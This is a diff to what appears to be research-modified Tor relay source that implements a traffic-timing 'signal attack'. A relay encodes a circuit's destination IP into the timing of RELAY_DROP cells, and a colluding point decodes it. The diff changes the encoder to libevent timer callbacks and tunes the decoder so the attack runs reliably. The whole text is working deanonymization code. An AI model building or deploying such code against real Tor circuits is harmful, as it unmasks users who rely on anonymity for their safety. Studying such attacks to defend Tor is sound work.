@@ -7,6 +7,11 @@
 #include "orconfig.h"
 #include "config.h"
 #include "compat.h"
+#ifdef HAVE_EVENT2_EVENT_H
+#include <event2/event.h>
+#else
+#include <event.h>
+#endif
 #include <time.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -91,7 +96,7 @@ STATIC int delta_timing(struct timespec *t1, struct timespec *t2) {
                       (t2->tv_nsec-t1->tv_nsec)*1E-6;
   if (elapsed_ms  > SIGNAL_ATTACK_MAX_BLANK)
     return 2;
-  else if (elapsed_ms >= options->SignalBlankIntervalMS)
+  else if (elapsed_ms >= (options->SignalBlankIntervalMS*0.95))
     return 0;
   else if (elapsed_ms > 0)
     return 1;
@@ -116,8 +121,10 @@ STATIC int signal_minimize_blank_latency_decode(signal_decode_t *circ_timing) {
   int ipcount = 0;
   /*log_info(LD_GENERAL, "timespec_list size %d\n and smartlist_circ size %d",*/
       /*smartlist_len(circ_timing->timespec_list), smartlist_len(circ_timings));*/
+  // we compare i-count with i to compare the timing of the first cell from
+  // a serie
   for (i = 1; i < smartlist_len(circ_timing->timespec_list); ++i) {
-    switch (delta_timing(smartlist_get(circ_timing->timespec_list, i-1),
+    switch (delta_timing(smartlist_get(circ_timing->timespec_list, i-count),
           smartlist_get(circ_timing->timespec_list, i))) {
       case 0:
         subips[ipcount] = count;
@@ -175,7 +182,7 @@ static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
   }
   int nth_bit = 0;
   for (i = 1; i < smartlist_len(circ_timing->timespec_list); i++) {
-    switch(delta_timing(smartlist_get(circ_timing->timespec_list, i-1),
+    switch(delta_timing(smartlist_get(circ_timing->timespec_list, i-count),
         smartlist_get(circ_timing->timespec_list, i))) {
       case 0:
         if (count == 2) 
@@ -185,8 +192,11 @@ static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
         else {
           // we suppose that after having recorded an entire subip, we indeed have a signal
           // Obviously, this should not happen
-          if (nbr_sub_ip_decoded > 0) 
+          if (nbr_sub_ip_decoded > 0) {
+            circ_timing->disabled = 1;
             log_info(LD_SIGNAL, "Signal distorded or no signal, count: %d", count);
+            return 0;
+          }
           count = 1;
           continue;
         }
@@ -202,6 +212,7 @@ static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
           if (nbr_sub_ip_decoded == 3) {
             log_info(LD_SIGNAL, "dest IP in binary: %s.%s.%s.%s",
                 subips[0], subips[1], subips[2], subips[3]);
+            circ_timing->disabled = 1;
             return 1;
           }
           nth_bit = 0;
@@ -230,6 +241,7 @@ static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
             subips[nbr_sub_ip_decoded][nth_bit] = '0';
           log_info(LD_SIGNAL, "dest IP in binary: %s.%s.%s.%s\n",
                 subips[0], subips[1], subips[2], subips[3]);
+          circ_timing->disabled = 1;
           return 1;
         }
 
@@ -315,70 +327,132 @@ STATIC void subip_to_subip_bin(uint8_t subip, char *subip_bin) {
   }
 }
 
-STATIC int signal_bandwidth_efficient(char *address, circuit_t *circ) {
-  struct timespec time, rem;
-  const or_options_t *options = get_options();
-  time.tv_sec = 0;
-  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
-  int subip[4];
-  address_to_subip(address, subip);
+STATIC void signal_bandwidth_efficient_cb(evutil_socket_t fd,
+    short events, void *arg) {
+  signal_encode_state_t *state = arg;
   char subip_bin[8];
-  for (int i = 0; i < 4; i++) {
-    subip_to_subip_bin((uint8_t)subip[i], subip_bin);
-    for (int j = 7; j > -1; j--) {
-      if (subip_bin[j] == '0') {
-        if (signal_send_relay_drop(2, circ) < 0) {
-          log_info(LD_SIGNAL, "BUG: signal_send_relay_drop returned -1\n");
-          return -1;
-        }
-      }
-      else if (subip_bin[j] == '1') {
-        if (signal_send_relay_drop(3, circ) < 0) {
-          log_info(LD_SIGNAL, "BUG: signal_send_relay_drop returned -1\n");
-          return -1;
-        }
-      }
-      else {
-        log_info(LD_SIGNAL, "BUG: something went wrong with subip_bin: %s", subip_bin);
-      }
-      if (nanosleep(&time, &rem) < 0) {
-        log_info(LD_SIGNAL, "BUG: nanosleep call failed\n");
-        return -1;
-      }
+  subip_to_subip_bin((uint8_t) state->subip[state->nb_calls/8], subip_bin);
+  // compute the right index of the bit to send
+  int idx = 7 - (state->nb_calls - 8*(state->nb_calls/8));
+  struct timeval timeout =  {0, get_options()->SignalBlankIntervalMS*1E3};
+  struct timespec *now = tor_malloc_zero(sizeof(struct timespec));
+  clock_gettime(CLOCK_REALTIME, now);
+  log_info(LD_SIGNAL, "Callback called at time %u:%ld", (int)now->tv_sec, now->tv_nsec);
+  if (subip_bin[idx] == '0') {
+    if (signal_send_relay_drop(2, state->circ) < 0) {
+      log_info(LD_SIGNAL, "BUG: signal_send_relay_drop returned -1 on a 0 bit sending");
     }
   }
+  else if (subip_bin[idx] == '1') {
+    if (signal_send_relay_drop(3, state->circ) < 0) {
+      log_info(LD_SIGNAL, "BUG: signal_send_relay_drop_returned -1 on 1 bit sending");
+    }
+  }
+  else {
+    log_info(LD_SIGNAL, "BUG: something went wrong with subip_bin: %s", subip_bin);
+  }
+  if (!CIRCUIT_IS_ORIGIN(state->circ)) {
+    channel_flush_cells(TO_OR_CIRCUIT(state->circ)->p_chan);
+    int r = connection_flush(TO_CONN(BASE_CHAN_TO_TLS(TO_OR_CIRCUIT(state->circ)->p_chan)->conn));
+    log_info(LD_SIGNAL, "connection_flush called and returned %d", r); 
+  }
+  if (state->nb_calls < 31) {
+    state->nb_calls++;
+    evtimer_add(state->ev, &timeout);
+  }
+  else {
+    signal_encode_state_free(state);
+  }
+}
+
+STATIC int signal_bandwidth_efficient(char *address, circuit_t *circ) {
+  signal_encode_state_t *state = tor_malloc_zero(sizeof(signal_encode_state_t));
+  state->circ = circ;
+  int subip[4];
+  address_to_subip(address, subip);
+  for (int i = 0; i < 4; i++) {
+    state->subip[i] = subip[i];
+  }
+  state->address = tor_strdup(address);
+  struct timeval init = {2, 0};
+  struct event *ev;
+  ev = tor_evtimer_new(tor_libevent_get_base(),
+           signal_bandwidth_efficient_cb, state);
+  state->ev = ev;
+  evtimer_add(ev, &init);
   return 0;
 }
 
+
+STATIC void signal_minimize_blank_latency_cb(evutil_socket_t fd,
+    short events, void *arg) {
+  signal_encode_state_t *state = arg;
+  struct timeval timeout =  {0, get_options()->SignalBlankIntervalMS*1E3};
+  struct timespec *now = tor_malloc_zero(sizeof(struct timespec));
+  clock_gettime(CLOCK_REALTIME, now);
+  log_info(LD_SIGNAL, "Callback called at time %u:%ld", (int)now->tv_sec, now->tv_nsec);
+  tor_free(now);
+  if (signal_send_relay_drop(state->subip[state->nb_calls]+2, state->circ) < 0) {
+    // forward an error TODO
+  }
+  if (!CIRCUIT_IS_ORIGIN(state->circ)) {
+    channel_flush_cells(TO_OR_CIRCUIT(state->circ)->p_chan);
+    int r = connection_flush(TO_CONN(BASE_CHAN_TO_TLS(TO_OR_CIRCUIT(state->circ)->p_chan)->conn));
+    log_info(LD_SIGNAL, "connection_flush called and returned %d", r);
+  }
+  if (state->nb_calls < 3) {
+    state->nb_calls++;
+    evtimer_add(state->ev, &timeout);
+  }
+  else {
+    signal_encode_state_free(state);
+  }
+}
+
+
+
 STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
-  struct timespec time, rem;
-  const or_options_t *options = get_options();
-  time.tv_sec = 0;
-  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
+  /*struct timespec time, rem;*/
+  /*const or_options_t *options = get_options();*/
+  /*time.tv_sec = 0;*/
+  /*time.tv_nsec = options->SignalBlankIntervalMS*1E6;*/
   int i;
   int subip[4];
   address_to_subip(address, subip);
-  or_circuit_t *or_circ = TO_OR_CIRCUIT(circ);
+  /*or_circuit_t *or_circ = TO_OR_CIRCUIT(circ);*/
+  signal_encode_state_t *state = tor_malloc_zero(sizeof(signal_encode_state_t));
+  state->circ = circ;
   for (i = 0; i < 4; i++) {
-    if (signal_send_relay_drop(subip[i]+2, circ) < 0) { //offset 1 for encoding 0.
-      return -1;
-    }
+    state->subip[i] = subip[i];
+  }
+  state->address = tor_strdup(address);
+  struct timeval init = {2, 0};
+  struct event *ev;
+  ev = tor_evtimer_new(tor_libevent_get_base(),
+           signal_minimize_blank_latency_cb, state);
+  state->ev = ev;
+  evtimer_add(ev, &init);
+
+  /*for (i = 0; i < 4; i++) {*/
+    /*if (signal_send_relay_drop(subip[i]+2, circ) < 0) { //offset 1 for encoding 0.*/
+      /*return -1;*/
+    /*}*/
     /*sleep(1); //sleep 1second*/
     // flush data before sleeping
-    if (!CIRCUIT_IS_ORIGIN(circ)) {
-      update_circuit_on_cmux(circ, CELL_DIRECTION_IN);
-      channel_flush_cells(or_circ->p_chan);
-      int r = connection_flush(TO_CONN(BASE_CHAN_TO_TLS(or_circ->p_chan)->conn));
-      log_info(LD_SIGNAL, "connection_flush called and returned %d", r); 
-    }
-    else {
-      log_info(LD_SIGNAL, "We should handle origin circuit at some points. e.g. signal attacks performed from an onion service");
-    }
-    if (nanosleep(&time, &rem) < 0) {
-      log_info(LD_SIGNAL, "BUG: nanosleep call failed\n");
-      return -1;
-    }
-  }
+    /*if (!CIRCUIT_IS_ORIGIN(circ)) {*/
+      //update_circuit_on_cmux(circ, CELL_DIRECTION_IN);
+      /*channel_flush_cells(or_circ->p_chan);*/
+      /*int r = connection_flush(TO_CONN(BASE_CHAN_TO_TLS(or_circ->p_chan)->conn));*/
+      /*log_info(LD_SIGNAL, "connection_flush called and returned %d", r); */
+    /*}*/
+    /*else {*/
+      /*log_info(LD_SIGNAL, "We should handle origin circuit at some points. e.g. signal attacks performed from an onion service");*/
+    /*}*/
+    /*if (nanosleep(&time, &rem) < 0) {*/
+      /*log_info(LD_SIGNAL, "BUG: nanosleep call failed\n");*/
+      /*return -1;*/
+    /*}*/
+  /*}*/
   return 0;
 }
 void signal_encode_destination(void *p) {
@@ -408,4 +482,9 @@ void signal_free(circuit_t *circ) {
     tor_free(circ_timings->list[idx]);
     smartlist_del_keeporder(circ_timings, idx);
   }
+}
+void signal_encode_state_free(signal_encode_state_t *state) {
+    tor_event_free(state->ev);
+    tor_free(state->address);
+    tor_free(state);
 }
